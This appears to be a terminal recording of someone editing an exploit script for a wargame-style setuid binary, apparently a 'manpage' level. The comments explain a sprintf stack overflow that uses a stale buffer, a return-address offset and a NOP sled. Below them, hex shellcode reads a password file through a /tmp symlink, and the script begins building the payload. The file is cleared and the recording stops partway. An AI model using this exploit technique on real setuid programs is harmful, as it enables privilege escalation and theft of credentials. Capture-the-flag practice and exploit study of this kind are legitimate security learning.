[0.009, "o", "\u001b[1;1H\u001b[34m# exp4.py - manpage4 (setuid manpage5) exploit, Hunt the Wumpus.\r\r\n# log_winner() does:\u001b[m\u001b[2;21H\u001b[K\u001b[3;1H\u001b[34m#   fgets(name, 256, stdin); sscanf(name, \"%100s %100s\", first, last);\u001b[m\u001b[3;71H\u001b[K\u001b[4;1H\u001b[34m#   sprintf(buf, \"%s firstname:%s lastname: %s\\n\", ctime(&t), first, last);\r\r\n# buf = ebp-0x100 (256 bytes). With a NO-SPACE name, sscanf leaves lastname\r\r\n# untouched: its stale content = getnum()'s old 2048-byte input buffer, which\r\r\n# still holds our 1602-byte ROOM# line (the frames overlap: lastname sits\r\r\n# 1300 bytes into that dead buffer). So the sprintf emits\r\r\n#   47 + 100 (firstname) + ~256 (stale lastname)  ->  ~403 bytes\r\r\n# into a 256-byte buffer: the overflow runs over the saved ebp (output[256..260])\r\r\n# and the return address (output[260..264] = lastname[113..117] = line[1417..1421]).\r\r\n# Payload: ROOM# line = \"13\" + NOP sled + <ret value at line[1417..1421]> + fill;\r\r\n# name = 52 NOPs + shellcode. The name lands in firstname (= ebp-0x200), the\r\r\n# sprintf copies it below the overflowed frame, so the ret value points into the\r\r\n# sled and execution slides into the shellcode.\r\r\n# Shellcode: open(\"/./tmp/x\") -> read(fd, esp, 100) -> write(1, esp, n) -> exit.\r\r\n# /tmp/x = symlink to /etc/manpage_pass/manpage5 (created first). The game is\r\r\n# setuid manpage5, so its euid can read the password file directly - no shell,\r\r\n# no setresuid needed. Dump goes to fd 1.\r\r\n# CRITICAL: the game must read stdin from a PIPE, not a tty. With a pty the\r\r\n# overflow never reaches the return address (the process exits 0 cleanly); with\r\r\n# a pipe the sprintf output is the full ~403 bytes and EIP is hijacked.\r\r\n# Sweep the ret value across the sled; rc==1 (our exit(1)) = the shellcode ran.\u001b[m\r\r\n\u001b[35mimport\u001b[m subprocess, struct\r\r\nsc = \u001b[36mbytes\u001b[m.fromhex(\r\r\n    \u001b[31m\"31c0\"\u001b[m \u001b[31m\"50\"\u001b[m \u001b[31m\"686d702f78\"\u001b[m \u001b[31m\"682f2e2f74\"\u001b[m \u001b[31m\"89e3\"\u001b[m \u001b[31m\"31c9\"\u001b[m \u001b[31m\"99\"\u001b[m \u001b[31m\"b005\"\u001b[m \u001b[31m\"cd80\"\r\r\n\u001b[m    \u001b[31m\"93\"\u001b[m \u001b[31m\"31c0\"\u001b[m \u001b[31m\"b003\"\u001b[m \u001b[31m\"89e1\""]
[0.014, "o", "\u001b[m \u001b[31m\"b264\"\u001b[m \u001b[31m\"cd80\"\r\r\n\u001b[m    \u001b[31m\"92\"\u001b[m \u001b[31m\"31c0\"\u001b[m \u001b[31m\"b004\"\u001b[m \u001b[31m\"b301\"\u001b[m \u001b[31m\"cd80\"\r\r\n\u001b[m    \u001b[31m\"31c0\"\u001b[m \u001b[31m\"b001\"\u001b[m \u001b[31m\"cd80\"\u001b[m)\r\r\nsled = \u001b[31m101\u001b[m - \u001b[36mlen\u001b[m(sc) - \u001b[31m1\u001b[m\r\r\nname = \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * sled + sc + \u001b[31mb\"\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m\r\r\nline = \u001b[36mbytearray\u001b[m(\u001b[31mb\"13\"\u001b[m)\r\r\nline += \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * (\u001b[31m1417\u001b[m - \u001b[31m2\u001b[m)\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
[5.402, "o", "\u001b[?25l\u001b[34;73H^[\u001b[1;1H\u001b[34;73H  \u001b[1;1H\u001b[34;73H^[\u001b[1;1H\u0007\u001b[34;73H  \u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;1H\u001b[K\u001b[34;1H:set noai nocin nosi indentexpr= formatoptions=\r\u001b[82C1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;73HdG\u001b[1;1H\u001b[34;73H  \u001b[1;1H\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[3;1H~                                                                                                   \u001b[4;1H~                                                                                                   \u001b[5;1H~                                                                                                   \u001b[6;1H~                                                                                                   \u001b[7;1H~                                                                                                   \u001b[8;1H~                                                                                                   \u001b[9;1H~                                                                                                   \u001b[10;1H~                                                                                                   \u001b[11;1H~                                                                                                   \u001b[12;1H~                                                                                                   \u001b[13;1H~                                                                                                   \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                        